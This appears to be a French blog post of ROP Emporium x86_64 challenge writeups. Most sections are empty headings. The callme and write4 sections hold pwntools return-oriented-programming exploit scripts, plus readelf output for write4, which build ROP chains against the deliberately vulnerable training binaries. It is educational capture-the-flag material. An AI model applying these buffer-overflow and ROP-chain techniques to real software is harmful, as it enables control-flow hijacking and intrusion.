---
title: "ROP Emporium - Writeups"
description: Writeups des challenges x86_64 de ROP Emporium 
---

Aujourd'hui je vous propose mes writeups des challenges x86_64 de [ROP Emporium](https://ropemporium.com/). Vous pouvez retrouver les [scripts de solution](https://github.com/nuts7/nuts7.github.io/tree/master/articles/ropemporium-writeups) sur mon GitHub. 😀

# Sommaire
1. [ret2win](#ret2win-writeup)
2. [split](#split-writeup)
3. [callme](#callme-writeup)
4. [write4](#write4-writeup)
5. [badchars](#badchars-writeup)
6. [fluff](#fluff-writeup)
7. [pivot](#pivot-writeup)
8. [ret2csu](#ret2csu-writeup)

<div id='ret2win-writeup'/>
# ret2win

<div id='split-writeup'/>
# split

<div id='callme-writeup'/>
# callme

```py
from pwn import *

context.arch = 'amd64'
p = process("./callme")
elf = ELF("./callme")
rop = ROP("./callme")

padding = cyclic(40)
gadget = p64((rop.find_gadget(["pop rdi", "pop rsi", "pop rdx", "ret"]))[0]) # /R pop rdi in r2 and find a stub with pop rdi pop rsi pop rdx and ret
callme_1 = p64(elf.symbols['callme_one'])
callme_2 = p64(elf.symbols['callme_two'])
callme_3 = p64(elf.symbols['callme_three'])
arg_1 = p64(0xdeadbeefdeadbeef)
arg_2 = p64(0xcafebabecafebabe)
arg_3 = p64(0xd00df00dd00df00d)

def first_call(padding, gadget, callme_1):
    pld_1 = padding
    pld_1 += gadget
    pld_1 += arg_1
    pld_1 += arg_2
    pld_1 += arg_3
    pld_1 += callme_1
    return pld_1

def second_call(padding, gadget, callme_2): 
    pld_2 = gadget
    pld_2 += arg_1
    pld_2 += arg_2
    pld_2 += arg_3
    pld_2 += callme_2
    return pld_2

def third_call(padding, gadget, callme_3):
    pld_3 = gadget
    pld_3 += arg_1
    pld_3 += arg_2
    pld_3 += arg_3
    pld_3 += callme_3
    return pld_3

ropchain = first_call(padding, gadget, callme_1) 
ropchain += second_call(padding, gadget, callme_2)
ropchain += third_call(padding, gadget, callme_3)

p.sendline(ropchain)
p.interactive()

```

<div id='write4-writeup'/>
# write4

Après lecture de la description du [challenge write4](https://ropemporium.com/challenge/write4.html), nous comprenons que nous allons devoir **write flag.txt** en mémoire dans une **section du binaire accessible en écriture** et **call** la fonction `print_file()` dans la **PLT**. Il est spécifié que `print_file()` prend comme seul argument **l'emplacement mémoire** de flag.txt.

```py
❯ readelf -S write4
Il y a 29 en-têtes de section, débutant à l'adresse de décalage 0x1980:

En-têtes de section :
<...>
  [23] .data             PROGBITS         0000000000601028  00001028
       0000000000000010  0000000000000000  WA       0     0     8
  [24] .bss              NOBITS           0000000000601038  00001038
       0000000000000008  0000000000000000  WA       0     0     1
<..>
Clé des fanions :
  W (écriture), A (allocation), X (exécution), M (fusion), S (chaînes), I (info),
  L (ordre des liens), O (traitement supplémentaire par l'OS requis), G (groupe),
  T (TLS), C (compressé), x (inconnu), o (spécifique à l'OS), E (exclu),
  l (grand), p (processor specific)
```

```py
❯ readelf -s write4 | grep .data
     5: 0000000000601038     0 NOTYPE  GLOBAL DEFAULT   23 _edata
    48: 0000000000601028     0 NOTYPE  WEAK   DEFAULT   23 data_start
    49: 0000000000601038     0 NOTYPE  GLOBAL DEFAULT   23 _edata
    52: 0000000000601028     0 NOTYPE  GLOBAL DEFAULT   23 __data_start
```

```py
from pwn import *

context.arch = 'amd64'
p = process("./write4", stdin=PTY)
elf = ELF("./write4")
rop = ROP("./write4")

padding = cyclic(40)

data_segment = p64(elf.symbols["data_start"]) # readelf -s write4
flag_string = b"flag.txt"

pop_r14_pop_r15 = p64((rop.find_gadget(["pop r14", "pop r15", "ret"]))[0])
mov_ptr_r14_r15 = p64(0x400628)

pop_rdi = p64((rop.find_gadget(["pop rdi", "ret"]))[0])
print_file = p64(elf.symbols['print_file'])

pld = padding
pld += pop_r14_pop_r15 # to setup data addr & flag.txt in registers
pld += data_segment
pld += flag_string
pld += mov_ptr_r14_r15 # mov qword ptr [r14], r15 ; ret ==> to move flag.txt in data segment
pld += pop_rdi # to put the memory location of flag.txt in print_file() as argument
pld += data_segment
pld += print_file

p.sendline(pld)
p.interactive()
```


<div id='badchars-writeup'/>
# badchars

<div id='fluff-writeup'/>
# fluff

<div id='pivot-writeup'/>
# pivot

<div id='ret2csu-writeup'/>
# ret2csu
